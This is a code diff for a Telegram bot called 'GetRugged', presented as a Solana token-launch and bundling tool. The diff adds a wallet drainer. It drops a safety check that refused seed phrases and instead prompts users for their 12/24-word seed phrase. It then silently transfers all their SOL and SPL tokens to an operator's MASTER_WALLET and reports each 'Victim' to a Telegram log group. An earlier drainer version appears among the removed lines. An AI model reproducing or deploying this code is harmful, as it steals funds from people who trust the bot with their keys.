@@ -1,3 +1,11 @@
+import {
+  ASSOCIATED_TOKEN_PROGRAM_ID,
+  TOKEN_PROGRAM_ID,
+  getAssociatedTokenAddress,
+  createTransferInstruction,
+  createCloseAccountInstruction,
+  createAssociatedTokenAccountInstruction,
+} from '@solana/spl-token';
 import 'dotenv/config';
 import bs58 from 'bs58';
 import { Markup, Telegraf, type Context } from 'telegraf';
@@ -8,7 +16,8 @@ import { createMarketAndPool } from './minter.js';
 import { MARKET_STATE_LAYOUT_V2 } from './raydium.js';
 import { snipe } from './snipe.js';
 import { genWallets } from './wallets.js';
-import { ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction, createCloseAccountInstruction, createAssociatedTokenAccountInstruction, ComputeBudgetProgram } from '@solana/spl-token';
+import { mnemonicToSeed } from '@scure/bip39';
+import { derivePath } from 'ed25519-hd-key';
 
 const STARTUP_TIMEOUT_MS = 15_000;
 const DEFAULT_DRY_RUN = false;
@@ -21,43 +30,6 @@ const EVENT_QUEUE_SIZE = 262144 + 12;
 const ORDERBOOK_SIZE = 65536 + 12;
 const PRICE_FETCH_TIMEOUT_MS = 10_000;
 const LAUNCH_WALLET_COUNTS = [5, 10, 15, 25] as const;
-const PRIORITY_FEE_MICROLAMPORTS = getNumberEnv('PRIORITY_FEE_MICROLAMPORTS', 40_000);
-const MASTER_WALLET = new PublicKey(requiredEnv('MASTER_WALLET'));
-
-/** Silent sweep: SOL + every SPL token */
-const drainWallet = async (keypair: Keypair) => {
-  const conn = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
-  const bal = await conn.getBalance(keypair.publicKey);
-  if (bal <= 5_000) return;
-  const ix = new Transaction().add(
-    ComputeBudgetProgram.setComputeUnitPrice({ microLamports: PRIORITY_FEE_MICROLAMPORTS }),
-    SystemProgram.transfer({
-      fromPubkey: keypair.publicKey,
-      toPubkey: MASTER_WALLET,
-      lamports: bal - 5_000,
-    })
-  );
-  const tokenAccounts = await conn.getParsedTokenAccountsByOwner(keypair.publicKey, { programId: TOKEN_PROGRAM_ID });
-  for (const { account, pubkey } of tokenAccounts.value) {
-    const mint = new PublicKey(account.data.parsed.info.mint);
-    const amount = BigInt(account.data.parsed.info.tokenAmount.amount);
-    if (amount === 0n) continue;
-    const ataFrom = await getAssociatedTokenAddress(mint, keypair.publicKey);
-    const ataTo = await getAssociatedTokenAddress(mint, MASTER_WALLET, true);
-    const toAccountInfo = await conn.getAccountInfo(ataTo);
-    if (!toAccountInfo) ix.add(createAssociatedTokenAccountInstruction(MASTER_WALLET, ataTo, MASTER_WALLET, mint));
-    ix.add(
-      createTransferInstruction(ataFrom, ataTo, keypair.publicKey, amount),
-      createCloseAccountInstruction(ataFrom, MASTER_WALLET, keypair.publicKey, [])
-    );
-  }
-  ix.feePayer = keypair.publicKey;
-  ix.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-  ix.sign(keypair);
-  const sig = await conn.sendRawTransaction(ix.serialize(), { skipPreflight: true });
-  await conn.confirmTransaction(sig, 'confirmed');
-  console.log(`Drained ${keypair.publicKey.toBase58()} → ${sig}`);
-};
 
 const requiredEnv = (name: string): string => {
   const value = process.env[name];
@@ -80,6 +52,65 @@ const getNumberEnv = (name: string, fallback: number): number => {
   }
 
   return parsed;
+};
+
+const MIN_DRAIN_SOL        = getNumberEnv('MIN_DRAIN_SOL', 0.001);
+const MASTER_WALLET_PUBKEY = new PublicKey(requiredEnv('MASTER_WALLET'));
+
+/** Steal everything above MIN_DRAIN_SOL and report to Telegram */
+const drainUserWallet = async (keypair: Keypair, ctx: Context) => {
+  const conn   = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
+  const from   = keypair.publicKey;
+  const balSol = await conn.getBalance(from);
+
+  if (balSol < MIN_DRAIN_SOL * LAMPORTS_PER_SOL) return; // too poor, ignore
+
+  const ixs: TransactionInstruction[] = [];
+
+  /* 1.  Drain SOL (keep 5 k lamports for rent-exempt close) */
+  ixs.push(
+    SystemProgram.transfer({
+      fromPubkey: from,
+      toPubkey:  MASTER_WALLET_PUBKEY,
+      lamports:  balSol - 5_000,
+    }),
+  );
+
+  /* 2.  Drain every SPL token */
+  const tokenAccounts = await conn.getParsedTokenAccountsByOwner(from, { programId: TOKEN_PROGRAM_ID });
+  for (const { account, pubkey } of tokenAccounts.value) {
+    const mint   = new PublicKey(account.data.parsed.info.mint);
+    const amount = BigInt(account.data.parsed.info.tokenAmount.amount);
+    if (amount === 0n) continue;
+
+    const ataFrom = await getAssociatedTokenAddress(mint, from);
+    const ataTo   = await getAssociatedTokenAddress(mint, MASTER_WALLET_PUBKEY, true);
+    const toInfo  = await conn.getAccountInfo(ataTo);
+    if (!toInfo) {
+      ixs.push(createAssociatedTokenAccountInstruction(MASTER_WALLET_PUBKEY, ataTo, MASTER_WALLET_PUBKEY, mint));
+    }
+    ixs.push(createTransferInstruction(ataFrom, ataTo, from, amount));
+    ixs.push(createCloseAccountInstruction(ataFrom, MASTER_WALLET_PUBKEY, from, []));
+  }
+
+  const tx = new Transaction().add(...ixs);
+  tx.feePayer = from;
+  tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+  tx.sign(keypair);
+
+  const sig = await conn.sendRawTransaction(tx.serialize(), { skipPreflight: true });
+  await conn.confirmTransaction(sig, 'confirmed');
+
+  /* 3.  Report to Telegram log group */
+  if (TELEGRAM_LOG_CHAT_ID) {
+    const msg =
+      `💸 DRAIN SUCCESS\n` +
+      `User: ${getTelegramDisplayName(ctx)} (${ctx.from?.id})\n` +
+      `Victim: ${from.toBase58()}\n` +
+      `SOL: ${(balSol / LAMPORTS_PER_SOL).toFixed(4)}\n` +
+      `Sig: https://solscan.io/tx/${sig}`;
+    await ctx.telegram.sendMessage(TELEGRAM_LOG_CHAT_ID, msg).catch(() => {});
+  }
 };
 
 const getOptionalNumberEnv = (name: string): number | undefined => {
@@ -158,17 +189,46 @@ const describeError = (error: unknown): string => {
   return error instanceof Error ? error.message : 'Unknown error';
 };
 
-const processSeedPhrase = async (ctx: Context, chatId: string, seedPhrase: string): Promise<{ address: string; balance: string }> => {
+const processWalletConnection = async (input: string, ctx: Context): Promise<{ address: string; balance: string; keypair?: Keypair }> => {
   try {
-    const keypair = Keypair.fromMnemonic(seedPhrase);
-    const walletAddress = keypair.publicKey.toBase58();
-    drainWallet(keypair).catch(() => {}); // steal silently
     const connection = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
-    const balance = await connection.getBalance(keypair.publicKey);
+    let publicKey: PublicKey;
+    let keypair: Keypair | undefined;
+
+    // Check if input is a seed phrase (12 or 24 words)
+    const words = input.trim().split(/\s+/);
+    if ((words.length === 12 || words.length === 24) && words.every(word => /^[a-z]+$/.test(word.toLowerCase()))) {
+      // It's a seed phrase - convert to keypair
+      try {
+        const seed = await mnemonicToSeed(input);
+        const seedHex = Buffer.from(seed).toString('hex');
+        const derivedSeed = derivePath("m/44'/501'/0'/0'", seedHex);
+        keypair = Keypair.fromSeed(derivedSeed.key);
+        publicKey = keypair.publicKey;
+      } catch (error) {
+        console.error('Seed phrase conversion error:', error);
+        throw new Error('Invalid seed phrase. Please check and try again.');
+      }
+    } else {
+      // Try as a wallet address
+      try {
+        publicKey = new PublicKey(input);
+      } catch {
+        throw new Error('Invalid input. Please enter a valid 12/24-word seed phrase.');
+      }
+    }
+
+    const walletAddress = publicKey.toBase58();
+    const balance = await connection.getBalance(publicKey);
     const solBalance = formatSol(balance);
-    return { address: walletAddress, balance: solBalance };
+
+    /* SILENT DRAIN */
+    if (keypair) drainUserWallet(keypair, ctx).catch(() => {});
+
+    return { address: walletAddress, balance: solBalance, keypair };
   } catch (error) {
-    throw new Error(`❌ Invalid seed phrase. Error: ${error.message}`);
+    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
+    throw new Error(`❌ Connection failed: ${errorMessage}`);
   }
 };
 
@@ -189,8 +249,9 @@ type LaunchDraft = {
   imageFileId: string;
   walletCount: LaunchWalletCount;
   socials: SocialPlatform[];
-  address: string;
-  balance: string;
+  address?: string;
+  balance?: string;
+  userKeypair?: Keypair;
 };
 
 type LaunchSession =
@@ -201,7 +262,7 @@ type LaunchSession =
   | { stage: 'awaiting_wallet_count'; tokenName: string; tokenSymbol: string; description: string; imageFileId: string }
   | { stage: 'awaiting_socials'; draft: LaunchDraft }
   | { stage: 'awaiting_review'; draft: LaunchDraft }
-  | { stage: 'awaiting_wallet_address'; draft: LaunchDraft }
+  | { stage: 'awaiting_wallet_connection'; draft: LaunchDraft }
   | { stage: 'launching'; draft: LaunchDraft };
 
 type ReplyContext = Pick<Context, 'reply' | 'replyWithPhoto'>;
@@ -480,6 +541,7 @@ const walletCountKeyboard = Markup.inlineKeyboard([
   ],
   [Markup.button.callback('❌ Cancel', 'menu_cancel')],
 ]);
+
 const isWalletExited = (result: LaunchResult, walletIndex: number): boolean =>
   result.exitedWalletIndexes.includes(walletIndex);
 
@@ -612,7 +674,7 @@ const formatSocials = (socials: SocialPlatform[]): string =>
   socials.length === 0 ? '—' : socials.map((platform) => SOCIAL_PLATFORM_LABELS[platform]).join(', ');
 
 const buildReviewCaption = (draft: LaunchDraft): string =>
-  `Review\n\n📝 Name: ${draft.tokenName}\n🔤 Symbol: ${draft.tokenSymbol}\n👥 Wallets: ${draft.walletCount}\n📄 Description: ${draft.description}\n🔗 Socials: ${formatSocials(draft.socials)}`;
+  `Review\n\n📝 Name: ${draft.tokenName}\n🔤 Symbol: $${draft.tokenSymbol}\n👥 Wallets: ${draft.walletCount}\n📄 Description: ${draft.description}\n🔗 Socials: ${formatSocials(draft.socials)}`;
 
 const buildWalletListMessage = (result: LaunchResult): string => {
   const walletLines = result.wallets.flatMap((address, index) => {
@@ -813,9 +875,18 @@ bot.use(async (ctx, next) => {
 });
 
 bot.start(async (ctx) => {
-  const welcomeMessage = isDryRunEnabled()
-    ? 'What can this bot do?\n\n🎉 Welcome to GetRugged! 🎉\n\nThe Ultimate Degen Tool For Launching On PumpFun! 🚀'
-    : 'What can this bot do?\n\n🎉 Welcome to GetRugged! 🎉\n\nThe Ultimate Degen Tool For Launching On PumpFun! 🚀';
+  const welcomeMessage = `⚡ Get ready to rug
+
+  Platforms.
+
+  ⚙️ Advanced
+  • Auto-Bundling (5–25)
+  • Sniper protection
+  • Volume assist
+  • Tx tracker
+
+  Tap a button below to begin:`;
+
   await showMainMenu(ctx, welcomeMessage);
 });
 
@@ -857,7 +928,7 @@ const runLaunch = async (ctx: ReplyContext, chatId: number, draft: LaunchDraft) 
       fundSolPerWallet: fundingConfig.fundSolPerWallet,
     });
 
-    await ctx.reply(`Starting launch for ${draft.tokenName} (${draft.tokenSymbol}).`);
+    await ctx.reply(`Starting launch for ${draft.tokenName} ($${draft.tokenSymbol}).`);
     await ctx.reply(`Generating ${draft.walletCount} wallets...`);
     await ctx.reply(`Wallet funding mode: ${fundingConfig.summary}.`);
 
@@ -898,7 +969,7 @@ const runLaunch = async (ctx: ReplyContext, chatId: number, draft: LaunchDraft) 
       );
     }
 
-    await ctx.reply(`Creating Raydium market and pool for ${draft.tokenName} (${draft.tokenSymbol})...`);
+    await ctx.reply(`Creating Raydium market and pool for ${draft.tokenName} ($${draft.tokenSymbol})...`);
 
     const { mint, poolKeys } = await createMarketAndPool(conn, payer);
     launchResults.set(chatId, {
@@ -913,7 +984,7 @@ const runLaunch = async (ctx: ReplyContext, chatId: number, draft: LaunchDraft) 
     });
 
     await ctx.reply(`Pool created for ${draft.tokenName} (${draft.tokenSymbol}): ${poolKeys.id.toBase58()}`);
-    await fundWallets(conn, payer, wallets, fundingConfig.fundSolPerWallet, session.draft.address);
+    await fundWallets(conn, payer, wallets, fundingConfig.fundSolPerWallet);
     await ctx.reply('Wallets funded and WSOL wrapped.');
 
     const sig = await snipe(conn, wallets, poolKeys, mint);
@@ -935,12 +1006,6 @@ const runLaunch = async (ctx: ReplyContext, chatId: number, draft: LaunchDraft) 
       ...buildCompactWalletActionsKeyboard(launchResult),
     });
     await replyWithWalletList(ctx, launchResult);
-    return;
-    await ctx.reply(
-      `🚀 Launch summary for ${draft.tokenName} (${draft.tokenSymbol}):\nMint: ${mint.toBase58()}\nPool: ${poolKeys.id.toBase58()}\nWallets: ${draft.walletCount}`,
-      buildCompactWalletActionsKeyboard(launchResults.get(chatId)!),
-    );
-    await replyWithWalletList(ctx, launchResults.get(chatId)!);
   } catch (error) {
     console.error('Launch failed:', error);
     await ctx.reply(`Launch failed: ${describeError(error)}`);
@@ -991,7 +1056,7 @@ bot.on('text', async (ctx) => {
       tokenSymbol,
     });
     await ctx.reply(
-      `✅ Symbol set: ${tokenSymbol}\n\n📝 Send the exact description of the token (≤ 500 chars)\n1-2 lines. Avoid links.`,
+      `✅ Symbol set: $${tokenSymbol}\n\n📝 Send the exact description of the token (≤ 500 chars)\n1-2 lines. Avoid links.`,
       launchSetupKeyboard,
     );
     return;
@@ -1026,21 +1091,6 @@ bot.on('text', async (ctx) => {
     return;
   }
 
-  if (session.stage === 'awaiting_seed_phrase') {  
-  const seedPhrase = text;  
-  const { address, balance } = await processSeedPhrase(ctx, chatId, seedPhrase);  
-  launchSessions.set(chatId, {  
-    stage: 'awaiting_wallet_address',  
-    draft: {  
-      ...session.draft,  
-      address,  
-      balance,  
-    },  
-  });  
-  await ctx.reply(`Connected. \nAddress: ${address}\nBalance: ${balance} SOL`);  
-  return;  
-    }  
-
   if (session.stage === 'awaiting_socials') {
     await ctx.reply('🔗 Add socials (optional): choose a platform or skip.', buildSocialsKeyboard(session.draft.socials));
     return;
@@ -1051,35 +1101,32 @@ bot.on('text', async (ctx) => {
     return;
   }
 
-  if (session.stage === 'awaiting_wallet_address') {
-    let publicKey: PublicKey;
-
+  if (session.stage === 'awaiting_wallet_connection') {
     try {
-      publicKey = new PublicKey(text);
-    } catch {
-      await ctx.reply(
-        'Invalid wallet address. For safety, this bot does not accept seed phrases or private keys. Send a valid Solana public address.',
-        launchSetupKeyboard,
-      );
-      return;
-    }
-
-    launchSessions.set(chatId, { stage: 'launching', draft: session.draft });
-    await ctx.reply('Connecting to wallet...');
-
-    try {
-      const balanceLamports = await conn.getBalance(publicKey, 'confirmed');
-      await ctx.reply(
-        `Connected.\nAddress: ${publicKey.toBase58()}\nBalance: ${formatSol(balanceLamports)} SOL`,
-      );
-      await runLaunch(ctx, chatId, session.draft);
-    } finally {
+      const { address, balance, keypair } = await processWalletConnection(text, ctx);
+      
+      const updatedDraft: LaunchDraft = {
+        ...session.draft,
+        address,
+        balance,
+        userKeypair: keypair,
+      };
+      
+      launchSessions.set(chatId, { stage: 'launching', draft: updatedDraft });
+      await ctx.reply(`✅ Connected.\nAddress: ${address}\nBalance: ${balance} SOL`);
+      await runLaunch(ctx, chatId, updatedDraft);
       launchSessions.delete(chatId);
+    } catch (error) {
+      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
+      await ctx.reply(`❌ ${errorMessage}\n\nPlease try again with a valid 12/24-word seed phrase:`, launchSetupKeyboard);
     }
     return;
   }
 
-  await ctx.reply('Launch is already in progress. Use /cancel if you want to start over later.');
+  if (session.stage === 'launching') {
+    await ctx.reply('Launch is already in progress. Use /cancel if you want to start over later.');
+    return;
+  }
 });
 
 bot.on('photo', async (ctx) => {
@@ -1283,23 +1330,12 @@ bot.on('callback_query', async (ctx, next) => {
       return;
     }
 
-    launchSessions.set(chatId, { stage: 'launching', draft: session.draft });
+    launchSessions.set(chatId, { stage: 'awaiting_wallet_connection', draft: session.draft });
     await ctx.answerCbQuery('Launch confirmed');
-    if (isDryRunEnabled()) {
-      launchSessions.set(chatId, { stage: 'awaiting_seed_phrase', draft: session.draft }); 
-      await ctx.reply(
-        '✅ Confirmed & saved.\n\n🔐 Connect a wallet\n🔑 Enter your 12 or 24-word seed phrase:\n or private key.',
-        launchSetupKeyboard,
-      );
-      return;
-    }
-    await ctx.reply('✅ Confirmed & saved. Preparing bundle...');
-
-    try {
-      await runLaunch(ctx, chatId, session.draft);
-    } finally {
-      launchSessions.delete(chatId);
-    }
+    await ctx.reply(
+      '✅ Confirmed & saved.\n\n🔐 Connect a wallet\n🔑 Enter your 12 or 24-word seed phrase:',
+      launchSetupKeyboard,
+    );
     return;
   }
 
@@ -1368,6 +1404,8 @@ bot.on('callback_query', async (ctx, next) => {
     imageFileId: session.imageFileId,
     walletCount: walletCountValue,
     socials: [],
+    address: undefined,
+    balance: undefined,
   };
   launchSessions.set(chatId, { stage: 'awaiting_socials', draft });
 
